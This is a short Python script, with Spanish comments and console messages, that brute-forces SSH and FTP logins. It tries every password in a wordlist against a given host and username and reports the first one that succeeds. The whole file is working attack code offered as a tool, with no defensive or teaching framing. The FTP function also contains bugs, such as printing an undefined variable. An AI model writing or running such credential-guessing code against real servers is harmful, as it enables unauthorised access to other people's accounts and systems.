import paramiko, ftplib, time, os;
from colorama import Fore, Style;





def ssh_attack(ip, port, username, password_list_path):


    
    os.path.abspath(password_list_path)


    #Abrimos el archivo con permisos de red y separamos por saltos en linea
    with open(password_list_path, "r") as password_file:
        #Igualamos la variable password_list al archivo en modo lectura y separado por saltos en linea 
        password_list = password_file.read().split("\n")

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:

        try:
            print(f"{Fore.RED}Vamos a intentar con: {password}{Style.RESET_ALL}")
            ssh.connect(ip, port=port, username=username, password=password)

            print(f"{Fore.GREEN}Conexion Exitosa!! Username: {username}  Password: {password}{Style.RESET_ALL}")

            
            time.sleep(15)
            return password

        except Exception as e:
            print(f"Ha sucedido un error: {e}")
        
    print("No se pudo encontrar una contraseña válida.")

    # Cerrar la conexión después de intentar todas las contraseñas
    ssh.close()



def ftp_attack(ip, usuario, password_list_path):
    with open(password_list_path, "r") as password_file:
        password_list = password_file.read().split("\n")

    ftp = ftplib.FTP(ip)

    for password in password_list:
        try:

            print(f"{Fore.RED}Vamos a intentar con: {password}{Style.RESET_ALL}")

            
            ftp = ftplib.FTP(ip)
            ftp.login(usuario, password)
            ftp.quit()

            
            print(f"{Fore.GREEN}Conexion Exitosa!! Username: {username}  Password: {password}{Style.RESET_ALL}")
            return password

        except Exception as e:
            print(f"Ha sucedido un error: {e}")
            ftp.quit()
             
    print("No se encontro la contraseña")
    ftp.close()























